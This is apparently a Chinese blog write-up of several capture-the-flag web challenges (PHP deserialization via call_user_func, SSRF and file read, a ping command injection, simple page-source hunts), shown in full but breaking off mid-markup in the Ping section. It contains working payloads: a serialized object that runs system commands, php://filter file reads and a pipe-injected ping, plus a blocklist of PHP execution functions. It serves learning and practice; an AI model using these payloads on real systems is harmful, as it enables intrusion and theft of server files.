朱雀组]phpweb</h1><p>开门见孙笑川，然后会自己刷新，每次刷新都爆一样的错误</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-type">date</span>(): It <span class="hljs-built_in">is</span> <span class="hljs-built_in">not</span> safe <span class="hljs-keyword">to</span> rely <span class="hljs-keyword">on</span> the system<span class="hljs-comment">&#x27;s timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected the timezone &#x27;UTC&#x27; for now, but please set date.timezone to select your timezone. in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;24&lt;/b&gt;&lt;br /&gt;</span><br><span class="hljs-number">2025</span>-<span class="hljs-number">05</span>-<span class="hljs-number">07</span> <span class="hljs-number">02</span>:<span class="hljs-number">09</span>:<span class="hljs-number">32</span> pm<br></code></pre></td></tr></table></figure><p>问一下deepseek：<br>这个警告意味着PHP在处理日期和时间时没有找到有效的时区设置。</p><p>好吧，知道站点真实目录   </p><p>扫一下目录,啥也没扫到<br>用bp抓包，发现它要刷新时就会向服务器返回如下请求头  </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /index.php HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: b29f3d09-<span class="hljs-number">8</span>d9e-<span class="hljs-number">4</span>cdd-<span class="hljs-number">948</span>e-<span class="hljs-number">6</span>cce2ae6d854.node5.buuoj.cn:<span class="hljs-number">81</span><br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">29</span><br><span class="hljs-attribute">Cache</span>-Control: max-age=<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Origin</span>: http://b29f3d09-<span class="hljs-number">8</span>d9e-<span class="hljs-number">4</span>cdd-<span class="hljs-number">948</span>e-<span class="hljs-number">6</span>cce2ae6d854.node5.buuoj.cn:<span class="hljs-number">81</span><br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">129</span>.<span class="hljs-number">0</span>.<span class="hljs-number">6668</span>.<span class="hljs-number">71</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span><br><span class="hljs-attribute">Referer</span>: http://b29f3d09-<span class="hljs-number">8</span>d9e-<span class="hljs-number">4</span>cdd-<span class="hljs-number">948</span>e-<span class="hljs-number">6</span>cce2ae6d854.node5.buuoj.cn:<span class="hljs-number">81</span>/index.php<br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate, br<br><span class="hljs-attribute">Connection</span>: keep-alive<br><br><span class="hljs-attribute">func</span>=date&amp;p=Y-m-d+h%<span class="hljs-number">3</span>Ai%<span class="hljs-number">3</span>As+a<br></code></pre></td></tr></table></figure><p>把date改为flag.php看看  </p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-built_in">Warning</span>: call_user_func() expects parameter <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> be a <span class="hljs-keyword">valid</span> callback, <span class="hljs-keyword">function</span> <span class="hljs-string">&#x27;flag.php&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">found</span> <span class="hljs-keyword">or</span> invalid <span class="hljs-keyword">function</span> <span class="hljs-type">name</span> <span class="hljs-keyword">in</span> /var/www/html/<span class="hljs-keyword">index</span>.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><p>把p的值去掉值传func看看</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">Warning:</span> <span class="hljs-type">date</span>(): It <span class="hljs-built_in">is</span> <span class="hljs-built_in">not</span> safe <span class="hljs-keyword">to</span> rely <span class="hljs-keyword">on</span> the system<span class="hljs-comment">&#x27;s timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected the timezone &#x27;UTC&#x27; for now, but please set date.timezone to select your timezone. in /var/www/html/index.php on line 24</span><br></code></pre></td></tr></table></figure><p>没见过这种，没思路了<br>注意到，回显的时间好像符合p参数的格式<br>Y-m-d+h%3Ai%3As+a<br>那么尝试一下p参数  </p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">func=<span class="hljs-type">date</span>&amp;p=ls;ls<br><br><span class="hljs-symbol">Warning:</span> <span class="hljs-type">date</span>(): It <span class="hljs-built_in">is</span> <span class="hljs-built_in">not</span> safe <span class="hljs-keyword">to</span> rely <span class="hljs-keyword">on</span> the system<span class="hljs-comment">&#x27;s timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected the timezone &#x27;UTC&#x27; for now, but please set date.timezone to select your timezone. in /var/www/html/index.php on line 24</span><br>Wednesday12;Wednesday12<br></code></pre></td></tr></table></figure><p>没办法了，看wp吧  </p><p>看好像func和p是能直接执行函数的，p就是参数，我还以为date是一个自定义函数  </p><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs vhdl">func=echo&amp;p=./flag<br><br><span class="hljs-literal">Warning</span>: call_user_func() expects <span class="hljs-keyword">parameter</span> <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> be a valid callback, <span class="hljs-keyword">function</span> <span class="hljs-symbol">&#x27;echo</span>&#x27; <span class="hljs-keyword">not</span> found <span class="hljs-keyword">or</span> invalid <span class="hljs-keyword">function</span> name <span class="hljs-keyword">in</span> /var/www/html/index.php <span class="hljs-keyword">on</span> <span class="hljs-literal">line</span> <span class="hljs-number">24</span><br><br>func=system&amp;p=ls<br><br>Hacker...<br><br>func=highlight_file()&amp;p=./flag<br><br><span class="hljs-literal">Warning</span>: call_user_func() expects <span class="hljs-keyword">parameter</span> <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> be a valid callback, <span class="hljs-keyword">function</span> <span class="hljs-symbol">&#x27;highlight_file</span>()&#x27; <span class="hljs-keyword">not</span> found <span class="hljs-keyword">or</span> invalid <span class="hljs-keyword">function</span> name <span class="hljs-keyword">in</span> /var/www/html/index.php <span class="hljs-keyword">on</span> <span class="hljs-literal">line</span> <span class="hljs-number">24</span><br><br>func=highlight_file&amp;p=./flag<br><br><span class="hljs-literal">Warning</span>: highlight_file(./flag): failed <span class="hljs-keyword">to</span> <span class="hljs-keyword">open</span> stream: No such <span class="hljs-keyword">file</span> <span class="hljs-keyword">or</span> directory <span class="hljs-keyword">in</span> /var/www/html/index.php <span class="hljs-keyword">on</span> <span class="hljs-literal">line</span> <span class="hljs-number">24</span><br><br><span class="hljs-literal">Warning</span>: highlight_file(): Failed opening &#x27;./flag&#x27; <span class="hljs-keyword">for</span> highlighting <span class="hljs-keyword">in</span> /var/www/html/index.php <span class="hljs-keyword">on</span> <span class="hljs-literal">line</span> <span class="hljs-number">24</span><br><br>func=highlight_file&amp;p=/../../../flag<br><br><span class="hljs-literal">Warning</span>: highlight_file(/../../../flag): failed <span class="hljs-keyword">to</span> <span class="hljs-keyword">open</span> stream: No such <span class="hljs-keyword">file</span> <span class="hljs-keyword">or</span> directory <span class="hljs-keyword">in</span> /var/www/html/index.php <span class="hljs-keyword">on</span> <span class="hljs-literal">line</span> <span class="hljs-number">24</span><br><br><span class="hljs-literal">Warning</span>: highlight_file(): Failed opening &#x27;/../../../flag&#x27; <span class="hljs-keyword">for</span> highlighting <span class="hljs-keyword">in</span> /var/www/html/index.php <span class="hljs-keyword">on</span> <span class="hljs-literal">line</span> <span class="hljs-number">24</span><br><br>//看来无法进行目录穿越<br></code></pre></td></tr></table></figure><p>那就看源码吧<br>func&#x3D;highlight_file&amp;p&#x3D;index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;phpweb&lt;/title&gt;<br>    &lt;style type=<span class="hljs-string">&quot;text/css&quot;</span>&gt;<br>        body &#123;<br>            background: <span class="hljs-title function_ invoke__">url</span>(<span class="hljs-string">&quot;bg.jpg&quot;</span>) no-repeat;<br>            background-size: <span class="hljs-number">100</span>%;<br>        &#125;<br>        p &#123;<br>            color: white;<br>        &#125;<br>    &lt;/style&gt;<br>&lt;/head&gt;<br><br>&lt;body&gt;<br>&lt;script language=javascript&gt;<br>    <span class="hljs-title function_ invoke__">setTimeout</span>(<span class="hljs-string">&quot;document.form1.submit()&quot;</span>,<span class="hljs-number">5000</span>)<br>&lt;/script&gt;<br>&lt;p&gt;<br>    <span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$disable_fun</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-string">&quot;shell_exec&quot;</span>,<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-string">&quot;passthru&quot;</span>,<span class="hljs-string">&quot;proc_open&quot;</span>,<span class="hljs-string">&quot;show_source&quot;</span>,<span class="hljs-string">&quot;phpinfo&quot;</span>,<span class="hljs-string">&quot;popen&quot;</span>,<span class="hljs-string">&quot;dl&quot;</span>,<span class="hljs-string">&quot;eval&quot;</span>,<span class="hljs-string">&quot;proc_terminate&quot;</span>,<span class="hljs-string">&quot;touch&quot;</span>,<span class="hljs-string">&quot;escapeshellcmd&quot;</span>,<span class="hljs-string">&quot;escapeshellarg&quot;</span>,<span class="hljs-string">&quot;assert&quot;</span>,<span class="hljs-string">&quot;substr_replace&quot;</span>,<span class="hljs-string">&quot;call_user_func_array&quot;</span>,<span class="hljs-string">&quot;call_user_func&quot;</span>,<span class="hljs-string">&quot;array_filter&quot;</span>, <span class="hljs-string">&quot;array_walk&quot;</span>,  <span class="hljs-string">&quot;array_map&quot;</span>,<span class="hljs-string">&quot;registregister_shutdown_function&quot;</span>,<span class="hljs-string">&quot;register_tick_function&quot;</span>,<span class="hljs-string">&quot;filter_var&quot;</span>, <span class="hljs-string">&quot;filter_var_array&quot;</span>, <span class="hljs-string">&quot;uasort&quot;</span>, <span class="hljs-string">&quot;uksort&quot;</span>, <span class="hljs-string">&quot;array_reduce&quot;</span>,<span class="hljs-string">&quot;array_walk&quot;</span>, <span class="hljs-string">&quot;array_walk_recursive&quot;</span>,<span class="hljs-string">&quot;pcntl_exec&quot;</span>,<span class="hljs-string">&quot;fopen&quot;</span>,<span class="hljs-string">&quot;fwrite&quot;</span>,<span class="hljs-string">&quot;file_put_contents&quot;</span>);<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gettime</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span></span>) </span>&#123;<br>        <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span>);<br>        <span class="hljs-variable">$a</span>= <span class="hljs-title function_ invoke__">gettype</span>(<span class="hljs-variable">$result</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> == <span class="hljs-string">&quot;string&quot;</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;&#125;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;Y-m-d h:i:s a&quot;</span>;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;date&quot;</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;func != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable">$this</span>-&gt;func, <span class="hljs-variable">$this</span>-&gt;p);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-variable">$func</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;func&quot;</span>];<br>    <span class="hljs-variable">$p</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;p&quot;</span>];<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$func</span> != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-variable">$func</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$func</span>);<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$func</span>,<span class="hljs-variable">$disable_fun</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span>);<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Hacker...&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">?&gt;</span><br>&lt;/p&gt;<br>&lt;form  id=form1 name=form1 action=<span class="hljs-string">&quot;index.php&quot;</span> method=post&gt;<br>    &lt;input type=hidden id=func name=func value=<span class="hljs-string">&#x27;date&#x27;</span>&gt;<br>    &lt;input type=hidden id=p name=p value=<span class="hljs-string">&#x27;Y-m-d h:i:s a&#x27;</span>&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>可以看到过滤了一堆函数  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-string">&quot;shell_exec&quot;</span>,<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-string">&quot;passthru&quot;</span>,<span class="hljs-string">&quot;proc_open&quot;</span>,<span class="hljs-string">&quot;show_source&quot;</span>,<span class="hljs-string">&quot;phpinfo&quot;</span>,<span class="hljs-string">&quot;popen&quot;</span>,<span class="hljs-string">&quot;dl&quot;</span>,<span class="hljs-string">&quot;eval&quot;</span>,<span class="hljs-string">&quot;proc_terminate&quot;</span>,<span class="hljs-string">&quot;touch&quot;</span>,<span class="hljs-string">&quot;escapeshellcmd&quot;</span>,<span class="hljs-string">&quot;escapeshellarg&quot;</span>,<span class="hljs-string">&quot;assert&quot;</span>,<span class="hljs-string">&quot;substr_replace&quot;</span>,<span class="hljs-string">&quot;call_user_func_array&quot;</span>,<span class="hljs-string">&quot;call_user_func&quot;</span>,<span class="hljs-string">&quot;array_filter&quot;</span>, <span class="hljs-string">&quot;array_walk&quot;</span>,  <span class="hljs-string">&quot;array_map&quot;</span>,<span class="hljs-string">&quot;registregister_shutdown_function&quot;</span>,<span class="hljs-string">&quot;register_tick_function&quot;</span>,<span class="hljs-string">&quot;filter_var&quot;</span>, <span class="hljs-string">&quot;filter_var_array&quot;</span>, <span class="hljs-string">&quot;uasort&quot;</span>, <span class="hljs-string">&quot;uksort&quot;</span>, <span class="hljs-string">&quot;array_reduce&quot;</span>,<span class="hljs-string">&quot;array_walk&quot;</span>, <span class="hljs-string">&quot;array_walk_recursive&quot;</span>,<span class="hljs-string">&quot;pcntl_exec&quot;</span>,<span class="hljs-string">&quot;fopen&quot;</span>,<span class="hljs-string">&quot;fwrite&quot;</span>,<span class="hljs-string">&quot;file_put_contents&quot;</span><br></code></pre></td></tr></table></figure><p>好像没有file_get_contents() ?</p><p>func&#x3D;file_get_contents;highlight_file&amp;p&#x3D;flag<br>&#x2F;&#x2F;不行</p><p>func&#x3D;file_get_contents&amp;p&#x3D;&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</p><p>Warning: file_get_contents(&#x2F;..&#x2F;..&#x2F;..&#x2F;flag.php): failed to open stream: No such file or directory in &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php on line 24</p><p>不行，看wp说要用反序列化，仔细看一眼源码<br>有个function __destruct()<br>改不会是这个？  </p><p>可这里也没有unserialize 啊<br>为什么是用反序列化？</p><p>原来func就直接传unserialize啊<br>对哦，它也是php的一个函数    </p><p>直接传</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">func</span>=unserialize&amp;p=O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;p&quot;</span>;s:<span class="hljs-number">18</span>:<span class="hljs-string">&quot;find / -name flag*&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span>;&#125;<br><br></code></pre></td></tr></table></figure><p>然后_destruct 就能触发了  </p><p>就能找到flag位置了</p><h1 id="NISACTF-2022-easyssrf"><a href="#NISACTF-2022-easyssrf" class="headerlink" title="[NISACTF 2022]easyssrf"></a>[NISACTF 2022]easyssrf</h1><p>给一个获取网页快照的功能<br>那不用猜就是有curl函数<br>扫一下目录没扫出东西  </p><p>抓包得到</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>node7.anna.nssctf.cn:29484<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>26<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://node7.anna.nssctf.cn:29484<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://node7.anna.nssctf.cn:29484/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-mel">url=<span class="hljs-keyword">file</span>%3A%2F%2Findex.php</span><br></code></pre></td></tr></table></figure><p>f12 源码也没有功能源码  </p><p>输入file:&#x2F;&#x2F;&#x2F;flag<br>提示：<br>都说了这里看不了flag。。但是可以看看提示文件：&#x2F;fl4g  </p><p>file:&#x2F;&#x2F;&#x2F;fl4g  </p><p>你应该看看除了index.php，是不是还有个ha1x1ux1u.php  </p><p>file:&#x2F;&#x2F;&#x2F;ha1x1ux1u.php<br>不行</p><p>在url里直接访问ha1x1ux1u.php<br>得到：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;file&quot;</span>))&#123;<br>  <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你败了.&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">//flag in /flag</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>);<br></code></pre></td></tr></table></figure><p>不能用file:&#x2F;&#x2F;<br>但是竟然有file_get_contents()那就能用php伪协议  </p><p>直接传入：<br><a href="http://node7.anna.nssctf.cn:29484/ha1x1ux1u.php?file=/flag">http://node7.anna.nssctf.cn:29484/ha1x1ux1u.php?file=/flag</a>    </p><p>就拿到了flag?不用伪协议？</p><p>测试了一下，用php伪协议也可以：<br>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag<br>回显:<br>TlNTQ1RGezg4YmE0NWNjLTJlYTEtNGRiNS04MzY1LWMzOTA0MDFiNmQ5N30K</p><p>解码就是flag  </p><h1 id="LitCTF-2023-导弹迷踪"><a href="#LitCTF-2023-导弹迷踪" class="headerlink" title="[LitCTF 2023]导弹迷踪"></a>[LitCTF 2023]导弹迷踪</h1><p>老规矩，只玩一遍<br>f12 找到flag<br>flag字样被改为<br>F|L|A|G<br>直接搜搜不到的  </p><h1 id="NCTF-2018-签到题"><a href="#NCTF-2018-签到题" class="headerlink" title="[NCTF 2018] 签到题"></a>[NCTF 2018] 签到题</h1><p>找了半小时，cookie和请求头里面分别有两个假的flag  </p><p>真flag在源访问链接<br>即&#x2F;index.php的访问标头里  </p><h1 id="NSSCTF-2022-Spring-Recruit-ezgame"><a href="#NSSCTF-2022-Spring-Recruit-ezgame" class="headerlink" title="[NSSCTF 2022 Spring Recruit]ezgame"></a>[NSSCTF 2022 Spring Recruit]ezgame</h1><p>f12 直接找<br>或者修改前端都行  </p><h1 id="LitCTF-2023-Ping"><a href="#LitCTF-2023-Ping" class="headerlink" title="[LitCTF 2023]Ping"></a>[LitCTF 2023]Ping</h1><p>尝试一下ping我的blog，提示只能ping ip地址  </p><p>试了一下ping 我的服务ip 和 127.0.0.0<br>都是百分百丢包率  </p><p>不管了，抓包看看  </p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>node5.anna.nssctf.cn:29540<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>27<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://node5.anna.nssctf.cn:29540<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://node5.anna.nssctf.cn:29540/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-autoit">command=<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>&amp;<span class="hljs-built_in">ping</span>=<span class="hljs-built_in">ping</span></span><br></code></pre></td></tr></table></figure><p>改一下看看  </p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">command</span>=/&amp;ping=<span class="hljs-keyword">ls</span><br><br>没回显<br><br><span class="hljs-keyword">command</span>=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.0</span>|<span class="hljs-keyword">ls</span>&amp;ping=ping<br><br>/回显：<br><span class="hljs-built_in">index</span>.php<br>upload<br></code></pre></td></tr></table></figure><p>试了一下upload目录403  </p><p>那直接看根目录</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 